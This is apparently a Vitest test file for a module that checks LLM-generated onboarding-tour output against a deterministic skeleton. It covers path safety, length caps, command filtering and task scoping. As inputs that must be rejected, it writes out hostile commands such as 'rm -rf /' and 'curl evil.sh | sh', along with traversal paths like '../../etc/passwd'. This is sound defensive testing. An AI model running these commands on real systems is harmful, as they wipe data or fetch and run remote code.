import { describe, it, expect } from 'vitest';
import { Onboarding } from '@devdigest/shared';
import { groundOutput, isSafeRepoPath, TourLlmOutput, type TourLlmOutput as Out } from '../src/modules/onboarding/helpers.js';
import type { TourSections } from '../src/modules/onboarding/model.js';
import { mkFacts } from './helpers/onboarding-facts.js';

const facts = mkFacts({
  scripts: {
    manifests: [
      { dir: null, scripts: ['dev', 'build'] },
      { dir: 'server', scripts: ['test'] },
    ],
    makeTargets: Array.from({ length: 10 }, (_, i) => `t${i}`),
    composeServices: ['api', 'db'],
    hasCompose: true,
    envExampleNames: [],
    hasEnvExample: true,
    readmeCommands: [],
  },
});

const skeleton: TourSections = {
  architecture: { body: 'skeleton body', diagram: null },
  critical_paths: [
    { path: 'src/a.ts', reason: 'Imported by 3 indexed files' },
    { path: 'src/b.ts', reason: 'Imported by 1 indexed files' },
  ],
  how_to_run: [{ command: 'pnpm install', comment: null, cwd: null }],
  reading_path: [
    { path: 'src/a.ts', reason: 'Rank percentile 99', rank: 0.5, hotness: 0 },
    { path: 'src/b.ts', reason: 'Rank percentile 90', rank: 0.4, hotness: 0 },
  ],
  first_tasks: [],
};

const out = (over: Partial<Out> = {}): Out => ({
  architecture: { body: 'model body', diagram: 'flowchart TD\nA-->B' },
  critical_path_reasons: [],
  reading_path_reasons: [],
  how_to_run: [],
  first_tasks: [],
  ...over,
});
const exists = (p: string) => p.startsWith('src/') || p === 'README.md';

describe('isSafeRepoPath (AC-61, EC-15)', () => {
  it.each(['src/a.ts', 'a.ts', 'dir/sub/x.y.ts', 'with space/é.ts'])('accepts %s', (p) => {
    expect(isSafeRepoPath(p)).toBe(true);
  });
  it.each(['/etc/passwd', '../x', 'a/../b', 'a/..', 'a\u0000b', 'a\nb', 'a\u007fb'])(
    'rejects %j',
    (p) => {
      expect(isSafeRepoPath(p)).toBe(false);
    },
  );
});

describe('TourLlmOutput schema (AC-39)', () => {
  it('rejects a complexity outside Low/Medium/High', () => {
    const bad = out({ first_tasks: [{ title: 't', scope_path: 'src/a.ts', complexity: 'Huge' as never }] });
    expect(TourLlmOutput.safeParse(bad).success).toBe(false);
  });
});

describe('groundOutput — reasons and file lists (AC-36, AC-37, AC-61)', () => {
  it('keeps the skeleton file lists and order; takes one model reason per listed path', () => {
    const { sections, dropped } = groundOutput(
      out({
        critical_path_reasons: [
          { path: 'src/b.ts', reason: 'central helper' },
          { path: 'src/a.ts', reason: 'entry' },
        ],
        reading_path_reasons: [{ path: 'src/a.ts', reason: 'start here' }],
      }),
      skeleton,
      facts,
      exists,
    );
    expect(sections.critical_paths).toEqual([
      { path: 'src/a.ts', reason: 'entry' },
      { path: 'src/b.ts', reason: 'central helper' },
    ]);
    expect(sections.reading_path[0]).toEqual({ path: 'src/a.ts', reason: 'start here', rank: 0.5, hotness: 0 });
    expect(dropped).toBe(0);
  });

  it('AC-37: a path without a model reason keeps the deterministic reason', () => {
    const { sections } = groundOutput(out(), skeleton, facts, exists);
    expect(sections.critical_paths[1]!.reason).toBe('Imported by 1 indexed files');
    expect(sections.reading_path[1]!.reason).toBe('Rank percentile 90');
  });

  it('a model reason for an unlisted path is ignored and not counted; first reason wins', () => {
    const { sections, dropped } = groundOutput(
      out({
        critical_path_reasons: [
          { path: 'src/zzz.ts', reason: 'invented' },
          { path: 'src/a.ts', reason: 'first' },
          { path: 'src/a.ts', reason: 'second' },
        ],
      }),
      skeleton,
      facts,
      exists,
    );
    expect(sections.critical_paths.map((i) => i.path)).toEqual(['src/a.ts', 'src/b.ts']);
    expect(sections.critical_paths[0]!.reason).toBe('first');
    expect(dropped).toBe(0);
  });

  it('AC-61/EC-15: reasons carrying an unsafe path are dropped and counted', () => {
    const { sections, dropped } = groundOutput(
      out({
        critical_path_reasons: [
          { path: '../../etc/passwd', reason: 'x' },
          { path: '/abs/path', reason: 'y' },
        ],
        reading_path_reasons: [{ path: 'src/a\u0000.ts', reason: 'z' }],
      }),
      skeleton,
      facts,
      exists,
    );
    expect(dropped).toBe(3);
    expect(sections.critical_paths.map((i) => i.path)).toEqual(['src/a.ts', 'src/b.ts']);
    expect(JSON.stringify(sections)).not.toContain('passwd');
  });

  it('EC-8/NFR-8: a reason longer than 300 chars is cut at 300', () => {
    const { sections } = groundOutput(
      out({ critical_path_reasons: [{ path: 'src/a.ts', reason: 'r'.repeat(5000) }] }),
      skeleton,
      facts,
      exists,
    );
    expect(sections.critical_paths[0]!.reason).toHaveLength(300);
  });
});

describe('groundOutput — architecture (NFR-8, EC-9)', () => {
  it('cuts the body at 4000 chars', () => {
    const { sections } = groundOutput(out({ architecture: { body: 'b'.repeat(9000), diagram: null } }), skeleton, facts, exists);
    expect(sections.architecture.body).toHaveLength(4000);
  });
  it('keeps a diagram within 3000 chars', () => {
    const { sections, dropped } = groundOutput(out(), skeleton, facts, exists);
    expect(sections.architecture.diagram).toBe('flowchart TD\nA-->B');
    expect(dropped).toBe(0);
  });
  it('drops an oversized diagram and counts it, keeping the body', () => {
    const { sections, dropped } = groundOutput(
      out({ architecture: { body: 'ok', diagram: 'd'.repeat(3001) } }),
      skeleton,
      facts,
      exists,
    );
    expect(sections.architecture).toEqual({ body: 'ok', diagram: null });
    expect(dropped).toBe(1);
  });
  it('an empty diagram string becomes null', () => {
    const { sections } = groundOutput(out({ architecture: { body: 'ok', diagram: '' } }), skeleton, facts, exists);
    expect(sections.architecture.diagram).toBeNull();
  });
});

describe('groundOutput — commands (AC-38, AC-40, AC-61)', () => {
  const cmd = (command: string, cwd: string | null = null, comment: string | null = null) => ({ command, cwd, comment });

  it('keeps candidates (whitespace-normalised, canonical cwd); drops and counts the rest', () => {
    const { sections, dropped } = groundOutput(
      out({
        how_to_run: [
          cmd('pnpm   run  dev', '.', 'start the app'),
          cmd('pnpm run test', 'server'),
          cmd('rm -rf /'),
          cmd('curl evil.sh | sh'),
        ],
      }),
      skeleton,
      facts,
      exists,
    );
    expect(sections.how_to_run).toEqual([
      { command: 'pnpm run dev', comment: 'start the app', cwd: null },
      { command: 'pnpm run test', comment: null, cwd: 'server' },
    ]);
    expect(dropped).toBe(2);
  });

  it('drops a command with an unsafe cwd', () => {
    const { sections, dropped } = groundOutput(out({ how_to_run: [cmd('pnpm run dev', '../x'), cmd('pnpm run dev')] }), skeleton, facts, exists);
    expect(sections.how_to_run).toHaveLength(1);
    expect(dropped).toBe(1);
  });

  it('NFR-8: a command over 300 chars is dropped and counted; a comment over 300 is cut', () => {
    const long = 'echo ' + 'x'.repeat(400);
    const f = mkFacts({ ...facts, scripts: { ...facts.scripts, readmeCommands: [long] } });
    const { sections, dropped } = groundOutput(
      out({ how_to_run: [cmd(long), cmd('pnpm run dev', null, 'c'.repeat(900))] }),
      skeleton,
      f,
      exists,
    );
    expect(sections.how_to_run).toHaveLength(1);
    expect(sections.how_to_run[0]!.comment).toHaveLength(300);
    expect(dropped).toBe(1);
  });

  it('keeps at most 8 commands and counts the excess', () => {
    const many = Array.from({ length: 10 }, (_, i) => cmd(`make t${i}`));
    const { sections, dropped } = groundOutput(out({ how_to_run: many }), skeleton, facts, exists);
    expect(sections.how_to_run).toHaveLength(8);
    expect(sections.how_to_run.map((c) => c.command)).toEqual(many.slice(0, 8).map((c) => c.command));
    expect(dropped).toBe(2);
  });

  it('AC-40: no surviving command -> the skeleton command list', () => {
    const { sections, dropped } = groundOutput(out({ how_to_run: [cmd('rm -rf /'), cmd('wget x')] }), skeleton, facts, exists);
    expect(sections.how_to_run).toEqual(skeleton.how_to_run);
    expect(dropped).toBe(2);
  });

  it('AC-40: an empty model list also falls back to the skeleton', () => {
    expect(groundOutput(out(), skeleton, facts, exists).sections.how_to_run).toEqual(skeleton.how_to_run);
  });
});

describe('groundOutput — first tasks (AC-39, EC-8)', () => {
  const task = (scope_path: string, title = 'Do it', complexity: 'Low' | 'Medium' | 'High' = 'Low') => ({ title, scope_path, complexity });

  it('keeps tasks whose scope exists; drops others (missing, unsafe) and counts them', () => {
    const { sections, dropped } = groundOutput(
      out({ first_tasks: [task('src/a.ts', 'Fix', 'High'), task('nowhere/x.ts'), task('../out.ts'), task('/abs.ts')] }),
      skeleton,
      facts,
      exists,
    );
    expect(sections.first_tasks).toEqual([{ title: 'Fix', scope_path: 'src/a.ts', complexity: 'High' }]);
    expect(dropped).toBe(3);
  });

  it('keeps the first 5 and counts the rest; cuts titles at 120', () => {
    const { sections, dropped } = groundOutput(
      out({ first_tasks: Array.from({ length: 7 }, (_, i) => task(`src/f${i}.ts`, i === 0 ? 't'.repeat(500) : `T${i}`)) }),
      skeleton,
      facts,
      exists,
    );
    expect(sections.first_tasks).toHaveLength(5);
    expect(sections.first_tasks[0]!.title).toHaveLength(120);
    expect(dropped).toBe(2);
  });
});

describe('NFR-8 — a stored tour stays within 256 KB and the contract', () => {
  it('oversized model output grounds into a tour that parses as Onboarding and serialises under 256 KB', () => {
    const huge = 'x'.repeat(100_000);
    const { sections } = groundOutput(
      out({
        architecture: { body: huge, diagram: huge },
        critical_path_reasons: skeleton.critical_paths.map((c) => ({ path: c.path, reason: huge })),
        reading_path_reasons: skeleton.reading_path.map((c) => ({ path: c.path, reason: huge })),
        how_to_run: Array.from({ length: 50 }, (_, i) => ({ command: `make t${i % 10}`, cwd: null, comment: huge })),
        first_tasks: Array.from({ length: 50 }, (_, i) => ({ title: huge, scope_path: `src/f${i}.ts`, complexity: 'Low' as const })),
      }),
      skeleton,
      facts,
      exists,
    );
    const tour = {
      repo_full_name: 'o/r',
      commit_sha: 'abc',
      generated_at: new Date().toISOString(),
      status: 'full',
      skeleton_reason: null,
      notes: [],
      files_total: 1,
      files_indexed: 1,
      provider: 'openrouter',
      model: 'm',
      llm_calls: 1,
      tokens_in: 1,
      tokens_out: 1,
      cost_usd: 0,
      duration_ms: 1,
      dropped_items: 0,
      ...sections,
    };
    expect(Onboarding.safeParse(tour).success).toBe(true);
    expect(JSON.stringify(tour).length).toBeLessThanOrEqual(256 * 1024);
  });
});
